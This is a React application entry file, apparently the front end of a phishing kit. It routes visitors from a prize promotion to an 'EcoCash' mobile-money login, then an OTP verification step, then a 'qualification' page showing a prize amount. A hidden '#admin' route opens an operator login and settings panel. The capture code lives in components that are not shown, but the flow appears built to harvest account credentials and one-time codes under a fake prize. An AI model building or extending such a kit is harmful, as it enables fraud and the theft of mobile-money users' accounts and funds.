import { useState, useEffect } from 'react';
import { supabase } from './lib/supabase';
import { Session } from '@supabase/supabase-js';
import PromoPage, { PackageSelection, PromoData } from './components/PromoPage';
import EcoCashLogin from './components/EcoCashLogin';
import OTPVerification from './components/OTPVerification';
import QualificationPage from './components/QualificationPage';
import AdminLogin from './components/AdminLogin';
import AdminSettings from './components/AdminSettings';

type Step = 'welcome' | 'promo' | 'ecocash' | 'otp' | 'qualification';
type AdminView = 'login' | 'settings';

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('promo');
  const [applicationId, setApplicationId] = useState<string>('');
  const [packageSelection, setPackageSelection] = useState<PackageSelection | null>(null);
  const [applicationData, setApplicationData] = useState<PromoData | null>(null);

  // Admin state
  const [isAdminRoute, setIsAdminRoute] = useState(() => window.location.hash === '#admin');
  const [session, setSession] = useState<Session | null>(null);
  const [adminView, setAdminView] = useState<AdminView>('login');
  const [authBootstrapped, setAuthBootstrapped] = useState(false);

  useEffect(() => {
    // Track hash changes so navigating to #admin shows the admin panel
    const onHashChange = () => setIsAdminRoute(window.location.hash === '#admin');
    window.addEventListener('hashchange', onHashChange);

    // Bootstrap the auth session (onAuthStateChange does NOT fire on initial load reliably)
    supabase.auth.getSession().then(({ data }) => {
      setSession(data.session);
      setAdminView(data.session ? 'settings' : 'login');
      setAuthBootstrapped(true);
    });

    // onAuthStateChange — wrap async work to avoid deadlock
    const { data: authListener } = supabase.auth.onAuthStateChange((_event, newSession) => {
      (async () => {
        setSession(newSession);
        setAdminView(newSession ? 'settings' : 'login');
      })();
    });

    return () => {
      window.removeEventListener('hashchange', onHashChange);
      authListener.subscription.unsubscribe();
    };
  }, []);

  const handlePromoSubmit = (selection: PackageSelection) => {
    setPackageSelection(selection);
    setCurrentStep('ecocash');
  };

  const handleEcoCashSubmit = (id: string, phoneNumber: string) => {
    setApplicationId(id);
    setApplicationData({ fullName: 'Package subscriber', phoneNumber, email: '', prizeAmount: packageSelection?.price ?? 0 });
    setCurrentStep('otp');
  };

  const handleOTPSubmit = () => setCurrentStep('qualification');

  // ---------- Admin routing ----------
  if (isAdminRoute) {
    if (!authBootstrapped) {
      return (
        <div className="min-h-screen bg-slate-900 flex items-center justify-center">
          <div className="text-slate-400">Loading...</div>
        </div>
      );
    }

    if (session && adminView === 'settings') {
      return (
        <AdminSettings
          onLogout={() => {
            setSession(null);
            setAdminView('login');
          }}
          onBack={() => {
            window.location.hash = '';
            setIsAdminRoute(false);
          }}
        />
      );
    }

    return (
      <AdminLogin
        onSuccess={() => setAdminView('settings')}
        onBack={() => {
          window.location.hash = '';
          setIsAdminRoute(false);
        }}
      />
    );
  }

  // ---------- Public flow ----------
  return (
    <>
      {currentStep === 'promo' && (
        <PromoPage onNext={handlePromoSubmit} />
      )}

      {currentStep === 'ecocash' && packageSelection && (
        <EcoCashLogin
          packageSelection={packageSelection}
          onNext={handleEcoCashSubmit}
        />
      )}

      {currentStep === 'otp' && applicationData && (
        <OTPVerification
          applicationId={applicationId}
          phoneNumber={applicationData.phoneNumber}
          onNext={handleOTPSubmit}
        />
      )}

      {currentStep === 'qualification' && applicationData && (
        <QualificationPage
          applicationId={applicationId}
          fullName={applicationData.fullName}
          phoneNumber={applicationData.phoneNumber}
          prizeAmount={applicationData.prizeAmount}
        />
      )}
    </>
  );
}

export default App;
